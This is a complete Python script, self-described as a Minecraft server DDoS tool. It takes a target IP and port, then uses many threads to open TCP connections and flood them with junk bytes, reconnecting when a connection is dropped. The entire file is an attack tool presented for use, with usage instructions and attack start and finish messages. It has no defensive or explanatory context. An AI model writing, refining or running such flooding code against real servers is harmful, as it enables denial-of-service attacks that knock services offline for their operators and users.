#!/usr/bin/python3
# Minecraft Server DDoS Script
# Usage: python3 script.py <target_ip> <target_port> <packet_count> <threads>

import socket
import threading
import time
import sys

def send_packets(target_ip, target_port, packet_count, packet_size=1024):
    """Send packets to target server"""
    try:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        
        # Connect to target
        s.connect((target_ip, target_port))
        
        # Send packets
        for _ in range(packet_count):
            try:
                s.send(b'A' * packet_size)
            except socket.error:
                # Connection lost, reconnect
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, target_port))
                s.send(b'A' * packet_size)
                
        # Close socket
        s.close()
        
    except Exception as e:
        print(f"Error: {e}")

def attack(target_ip, target_port, packet_count, threads):
    """Launch attack using multiple threads"""
    # Create threads
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(
            target=send_packets,
            args=(target_ip, target_port, packet_count // threads)
        )
        thread_list.append(t)
    
    # Start threads
    for t in thread_list:
        t.start()
    
    # Wait for all threads to complete
    for t in thread_list:
        t.join()

def main():
    # Check arguments
    if len(sys.argv) != 5:
        print("Usage: python3 script.py <target_ip> <target_port> <packet_count> <threads>")
        sys.exit(1)
    
    # Parse arguments
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    packet_count = int(sys.argv[3])
    threads = int(sys.argv[4])
    
    # Launch attack
    print(f"Starting attack on {target_ip}:{target_port} with {packet_count} packets using {threads} threads")
    start_time = time.time()
    attack(target_ip, target_port, packet_count, threads)
    elapsed_time = time.time() - start_time
    
    # Report results
    print(f"Attack completed in {elapsed_time:.2f} seconds")

if __name__ == "__main__":
    main()
